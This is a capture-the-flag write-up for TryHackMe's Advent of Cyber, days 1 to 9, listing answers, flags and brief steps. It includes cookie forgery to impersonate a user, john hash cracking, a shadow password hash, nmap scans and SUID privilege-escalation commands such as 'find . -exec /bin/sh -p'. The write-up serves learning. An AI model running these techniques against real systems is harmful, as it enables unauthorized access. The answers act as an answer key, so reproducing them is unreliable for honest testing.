# ADVENT OF CYBER

## DAY 1: INVENTORY MANAGEMENT

> - **What is the name of the cookie used for authentication?**
>>authid

Just register an account and login. Then check your cookies

> - **If you decode the cookie, what is the value of the fixed part of the cookie?**
>> v4er9ll1!ss

Base64 decode the cookies.

> - **After accessing his account, what did the user mcinventory request?**
>> firewall

Append his username, mcinventory to the answer we got above. Then base64 encode it and change our cookies. Refresh the page and now we are mcinventory.

## DAY 2: ARCTIC FORUM

> - **What is the path of the hidden page?**
>> /sysadmin

> - **What is the password you found?**
>> defaultpass

Check out their github

> - **What do you have to take to the 'partay'**
>> eggnog

## DAY 3: EVIL ELF

> - **Whats the destination IP on packet number 998?**
>> 63.32.89.195

Go -> Go to packet

> - **What item is on the Christmas list?**
>> ps4

> - **Crack buddy's password!**
>> rainbow

`john day_3.hash --wordlist=/usr/share/wordlists/rockyou.txt`

##DAY 4: TRAINING

> - **How many visible files are there in the home directory(excluding ./ and ../)?**
>> 8

> - **What is the content of file5?**
>> recipes

> - **Which file contains the string ‘password’?**
>> file6

grep password *

> - **What is the IP address in a file in the home folder?**
>>  10.0.0.05

grep * -Eo "([0-9]{1,3}[\.]){3}[0-9]{1,3}"

> - **How many users can log into the machine?**
>> 3

> - **What is the sha1 hash of file8?**
>> fa67ee594358d83becdd2cb6c466b25320fd2835

sha1sum file8

> - **What is mcsysadmin’s password hash?**
>> $6$jbosYsU/$qOYToX/hnKGjT0EscuUIiIqF8GHgokHdy/Rg/DaB.RgkrbeBXPdzpHdMLI6cQJLdFlS4gkBMzilDBYcQvu2ro/

find / -name password

## DAY 5: HO-Ho-HOSINT

> - **What is Lola's date of birth? Format: Month Date, Year(e.g November 12, 2019)**
>> December 29, 1900

exiftool on the image. Find the creator and search on google.

> - **What is Lola's current occupation?**
>> Santa's helper

> - **What phone does Lola make?**
>> iPhone X

> - **What date did Lola first start her photography? Format: dd/mm/yyyy**
>> 23/10/2014

Using waybackmachine.com to view her blog and what it looks like before.

> - **What famous woman does Lola have on her web page?**
>> Ada Lovelace

Reverse image search

## DAY 6: DATA ELF-ILTRATION
> - **What data was exfiltrated via DNS?**
>> Candy Cane Serial Number 8491

using dns as filter, unhex the hex we found.

> - **What did Little Timmy want to be for Christmas?**
>> pentester

File -> export object -> http and choose christmaslist.txt and TryHackMe.jpg. Then unzip it with zip2john and john.

> - **What was hidden within the file?**
>> rfc527

steghide in TryHackMe.jpg. Empty password.

## DAY 7: SKILLING UP

> - **how many TCP ports under 1000 are open?**
>> 3

nmap -p 0-1000 $IP

> - **What is the name of the OS of the host?**
>> linux

nmap -A $IP

> - **What version of SSH is running?**
>> 7.4

nmap -sV -p22 $IP

> - **What is the name of the file that is accessible on the server you found running?**
>> interesting.file

Go to $IP:999 on browser

## DAY 8 : SUID SHENANIGANS

```
username: holly
password: tuD@4vt0G*TU
```
> - **What port is SSH running on?**
>> 65534

> - **Find and run a file as igor. Read the file /home/igor/flag1.txt**
>> THM{d3f0708bdd9accda7f937d013eaf2cd8}

```bash
find / -user igor -perm /4000 2>/dev/null
```
Then go to /usr/bin and we saw that find is own by igor and has the setgid bit set.
```bash
./find . -exec /bin/sh -p \; -quit
```
And now we are igor.

> - **Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?**
>>

```bash
find / -user root -perm /4000 2>/dev/null
```

This time it is systemctl or system-control

```bash
./systemctl
```
And now we are root.

## DAY 9: REQUESTS

> - **What is the value of the flag?**
>> sCrIPtKiDd

Check out the [code](day9/day9.py)